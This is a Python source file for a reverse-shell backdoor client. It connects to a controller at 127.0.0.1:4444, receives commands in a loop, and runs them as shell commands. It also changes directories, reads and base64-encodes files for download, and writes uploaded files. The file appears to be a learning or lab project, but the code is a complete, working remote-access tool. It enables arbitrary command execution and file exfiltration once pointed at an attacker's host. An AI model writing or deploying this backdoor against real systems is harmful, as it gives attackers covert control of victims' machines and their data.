import socket
import subprocess
import json
import base64
import os
import socket
from Crypto.Cipher import AES
#from base64 import b64encode, b64decode

key = b"H"*32

message = "test data"


class Backdoor:

    nonceKey = "nonce"
    ciphertextKey="ciphertext"

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True,stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            print(path)
            file.write(base64.b64decode(content))
            return ("[+] Upload successful")

    def run(self):
        # connection.send("\n[+] Connection Established. \n")
        while True:
            command = self.reliable_receive()
            print(command)
            try:

                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    if command[1]=="..":
                        command[1] = self.execute_system_command("echo %cd%")
                        command[1] = command[1].decode().rpartition('\\')[0]
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = "[-] Error during command execution. " + str(e)
            self.reliable_send(command_result)

    def reliable_send(self, data):
        if isinstance(data, bytes):
            json_data = json.dumps(data.decode())
        else:
            json_data = json.dumps(data)

        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue


backdoor = Backdoor("127.0.0.1", 4444)
backdoor.run()
